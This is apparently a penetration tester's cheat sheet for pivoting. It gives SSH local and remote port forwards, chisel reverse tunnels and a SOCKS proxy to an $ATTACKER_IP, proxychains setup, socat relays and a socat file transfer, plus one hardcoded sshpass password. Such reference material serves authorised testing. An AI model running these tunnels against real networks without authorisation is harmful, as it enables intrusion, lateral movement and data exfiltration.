Port forwarding from $TARGET_IP to localhost with SSH
---
```shell
ssh -N -L $PORT:localhost:$PORT $USER@$TARGET_IP
```

```bash
sshpass -p 'L1k3B1gBut7s@W0rk' ssh $USER@$TARGET_IP -L $PORT:127.0.0.1:$PORT
```

or run in background with -f option

```shell
ssh -N -f -L $PORT:localhost:$PORT $USER@$TARGET_IP
```

Forward port from remote machine to local machine:

```shell
service ssh start
```

then on remote machine

```shell
ssh -N -R $REMOTE_PORT:localhost:$PORT $USER@$ATTACKER_IP
```

Using CHISEL:
---
single port on attacker machine

```shell
chisel server --port 8000 --reverse
```

from jump box

```shell
./chisel client $ATTACKER_IP:8000 R:$PORT:$DEST_IP:$PORT
```

 Opening socks5 server on LOCAL machine on port 1080

```shell
chisel server --port 8001 --socks5 --reverse
```

on jump box

```shell
./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks
```

Then edit proxychains config:
  
```config
socks5 127.0.0.1 1080
```

Execute commands with

```
proxychains -q
```

in front of them

Forward local port to target IP with SOCAT
---
```
socat TCP-LISTEN:139,reuseaddr,fork TCP:$TARGET_IP:$PORT &
```

Using SOCAT to send file:
---
On receiving machine

```shell
socat -u TCP-LISTEN:9876,reuseaddr OPEN:$FILE_OUT,creat
```

and on sending machine

```shell
socat -u FILE:$FILE_OUT TCP:$RECEIVER_IP:9876
```